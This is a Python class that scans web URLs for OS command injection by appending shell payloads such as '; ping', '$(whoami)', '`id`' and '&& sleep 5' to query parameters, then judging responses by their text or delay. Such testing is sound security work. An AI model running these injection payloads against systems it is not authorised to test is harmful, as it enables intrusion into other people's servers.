import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


class CommandInjectionTester:
    """
    Advanced tester for detecting possible OS Command Injection vulnerabilities.
    """

    def __init__(self, session=None):
        self.session = session or requests.Session()
        self.vulnerable = []

        # Expanded command injection payloads
        self.payloads = [
            "; ping -c 1 127.0.0.1",
            "| ping -c 1 127.0.0.1",
            "& ping -c 1 127.0.0.1",
            "|| ping -c 1 127.0.0.1",
            "`whoami`",
            "$(whoami)",
            "; sleep 5",
            "&& sleep 5",
            "| sleep 5",
            "`id`",
            "$(id)"
        ]

    def extract_params(self, url):
        """
        Extract query parameters to test.
        """
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        return parsed, query_params

    def test_url(self, parsed, params):
        """
        Mutate parameters with command injection payloads.
        Detect via response text OR time-based delay.
        """
        for param, original_values in params.items():
            original_value = original_values[0]

            for payload in self.payloads:
                injected_value = original_value + payload
                new_query = parse_qs(parsed.query)
                new_query[param] = injected_value
                new_query_encoded = urlencode(new_query, doseq=True)

                new_parsed = parsed._replace(query=new_query_encoded)
                new_url = urlunparse(new_parsed)

                try:
                    resp = self.session.get(new_url, timeout=15)
                    elapsed = resp.elapsed.total_seconds()

                    evidence_text = resp.text[:200].strip().replace("\n", " ")

                    if "uid=" in resp.text or "root" in resp.text or "Linux" in resp.text:
                        vuln = {
                            "url": new_url,
                            "param": param,
                            "original_value": original_value,
                            "payload": payload,
                            "vuln_type": "Command Injection",
                            "severity": "Critical",
                            "evidence": f"Indicator found in response: {evidence_text}"
                        }
                        self.vulnerable.append(vuln)
                        print(f"[+] Possible Command Injection: {new_url}")

                    elif elapsed >= 5 and "sleep" in payload:
                        vuln = {
                            "url": new_url,
                            "param": param,
                            "original_value": original_value,
                            "payload": payload,
                            "vuln_type": "Blind Command Injection",
                            "severity": "Critical",
                            "evidence": f"Response delay: {elapsed:.2f}s"
                        }
                        self.vulnerable.append(vuln)
                        print(f"[+] Possible Blind Command Injection (delay): {new_url}")

                except requests.RequestException as e:
                    print(f"[!] Error testing command injection at {new_url}: {e}")

    def run(self, url_list):
        """
        Run Command Injection tests on all URLs.
        """
        for url in url_list:
            parsed, params = self.extract_params(url)
            if params:
                self.test_url(parsed, params)
        return self.vulnerable
